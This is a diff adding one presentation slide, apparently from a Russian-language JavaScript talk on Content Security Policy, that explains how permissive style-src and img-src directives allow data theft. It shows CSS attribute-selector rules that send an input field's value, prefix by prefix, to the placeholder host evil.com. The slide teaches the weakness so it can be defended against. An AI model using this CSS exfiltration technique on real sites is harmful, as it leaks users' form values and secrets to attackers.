@@ -1,0 +1,21 @@
+<section class="slide">
+    <div class="">
+        <div>
+            <h1>Основные директивы
+                <small>style-src + img-src</small>
+            </h1>
+            <div class="next">
+                <pre><code class="hljs">default-src: *; style-src: unsafe-inline; img-src: *</code></pre>
+            </div>
+            <div class="next">
+                <pre><code class="hljs css">input[value^=a] {
+    background-image: url("https://evil.com?a");
+}
+input[value^=ab] {
+    background-image: url("https://evil.com?ab");
+}</code></pre>
+            </div>
+        </div>
+        <img src="http://ed.titov.im/minskjs-feb-2020/pictures/no.png" alt="" class="cover next">
+    </div>
+</section>
